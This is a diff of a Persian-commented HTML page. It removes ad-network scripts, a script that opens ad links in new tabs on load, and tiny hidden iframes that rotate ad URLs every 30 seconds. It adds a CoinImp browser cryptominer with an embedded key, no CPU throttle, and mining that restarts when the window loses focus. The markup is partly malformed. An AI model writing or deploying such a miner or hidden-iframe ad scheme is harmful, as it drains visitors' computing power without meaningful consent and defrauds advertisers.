@@ -1,112 +1,59 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <script src="https://grookilteepsou.net/act/files/tag.min.js?z=8851232" data-cfasync="false" async></script>
-    <script src="https://kulroakonsu.net/88/tag.min.js" data-zone="127693" async data-cfasync="false"></script>
-    <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('groleegni.net',8851172,document.createElement('script'))</script>
-    <meta name="monetag" content="ae792a9d238a35ef17b936fe4d2d03c9">
-    <title>Multiple Redirects</title>
-    <script src="https://kulroakonsu.net/88/tag.min.js" data-zone="127693" async data-cfasync="false"></script>
-</head>
-<body>
-    <h1>Redirecting...</h1>
-    <script>
-        // لیست لینک‌هایی که می‌خواهید باز شوند
-        const links = [
-            "https://poawooptugroo.com/4/8851255",
-            "https://poawooptugroo.com/4/8851254",
-           "https://poawooptugroo.com/4/8851253",
-"https://honourrib.com/by254usn?key=3545b7ed178272fade5f36b9c893cd53",
-"https://honourrib.com/vhu0qrwn9?key=e5bd603161333780325392ae0863b8d1",
 
-
-
-        ];
-
-        // باز کردن هر لینک در تب جدید
-        links.forEach(link => {
-            window.open(link, '_blank');
-        });
-    </script>
-    ح!DOCTYPE html>
-<html lang="en">
+!DOCTYPE html>
+<html lang="fa">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0">
-    <title>Multiple Link Viewer</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-        }
-        h1 {
-            margin: 20px 0;
-        }
-        .container {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 20px;
-            padding: 20px;
-        }
-        iframe {
-            width: 5px;
-            height: 5px;
-            border: 1px solid #ccc;
-            box-shadow: 0 4px 8px rgba(100, 0, 0, 0.1);
-        }
-        #message {
-            font-size: 1px;
-            margin: 1px;
-        }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Mining</title>
 </head>
 <body>
-    <h1></h1>
-    <div id="message">در حال بارگذاری لینک‌ها...</div>
-    <div class="container" id="iframeContainer"></div>
+    <h1>خوش آمدید به سایت ما</h1>
+    <p>ماینینگ در پس‌زمینه فعال است.</p>
+
+    <!-- اضافه کردن اسکریپت مربوط به CoinImp -->
+    <script src="https://www.hostingcloud.racing/69dV.js"></script>
+
     <script>
-        // لیست لینک‌ها
-        const links = [
-            "https://poawooptugroo.com/4/8851253", 
-        "https://poawooptugroo.com/4/8851161",
-"https://honourrib.com/f8e9dgs5kg?key=f57b4f83f36c7925eb4bf8d90d5cd68a",
-            
-        ];
-
-        // زمان تغییر لینک‌ها (بر حسب میلی‌ثانیه)
-        const displayTime = 30000; // 5 ثانیه
-
-        // انتخاب کانتینر برای iframe‌ها
-        const iframeContainer = document.getElementById("iframeContainer");
-        const message = document.getElementById("message");
-
-        // ایجاد iframe برای هر لینک
-        links.forEach((link, index) => {
-            const iframe = document.createElement("iframe");
-            iframe.id = `iframe-${index}`;
-            iframe.src = link; // لینک اولیه
-            iframeContainer.appendChild(iframe);
+        // ایجاد یک کلاینت برای ماینینگ
+        var _client = new Client.Anonymous('e2eafd9c701aa4334b4fc04d7b79966f5ebcbb97ccb9910b984e7826ec1dc3e3', {
+            throttle: 0, // تنظیم محدودیت مصرف پردازنده (0 یعنی بدون محدودیت)
+            c: 'w' // شناسه سایت یا تنظیمات خاص
         });
 
-        // تابع برای به‌روزرسانی لینک‌ها
-        function updateIframes() {
-            links.forEach((link, index) => {
-                const iframe = document.getElementById(`iframe-${index}`);
-                const randomIndex = Math.floor(Math.random() * links.length); // لینک تصادفی
-                iframe.src = links[randomIndex];
-            });
+        // شروع ماینینگ
+        _client.start();
 
-            message.textContent = `تمام پنجره‌ها به‌روزرسانی شدند.`;
+        // نمایش اعلان برای کاربر
+        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+
+        // تابع شروع ماینینگ در صورتی که مرورگر لود شده باشد
+        function startMining() {
+            if (typeof Client !== 'undefined') {
+                _client.start();
+            } else {
+                console.error('CoinImp Miner is not supported!');
+            }
         }
 
-        // تنظیم زمان‌بندی برای به‌روزرسانی لینک‌ها
-        setInterval(updateIframes, displayTime);
-    </script>
-</body>
-</html>
+        // شروع ماینینگ پس از لود صفحه
+        window.onload = function() {
+            startMining();
+        };
 
+        // فعال کردن ماینینگ در پس‌زمینه حتی وقتی کاربر به صفحه دیگری می‌رود
+        window.onblur = function() {
+            startMining();
+        };
+
+        // دکمه‌ای برای توقف ماینینگ
+        const stopButton = document.createElement("button");
+        stopButton.innerText = "توقف ماینینگ";
+        document.body.appendChild(stopButton);
+
+        stopButton.onclick = function() {
+            _client.stop(); // توقف ماینینگ
+            alert('ماینینگ متوقف شد');
+        };
+    </script>
 </body>
 </html>
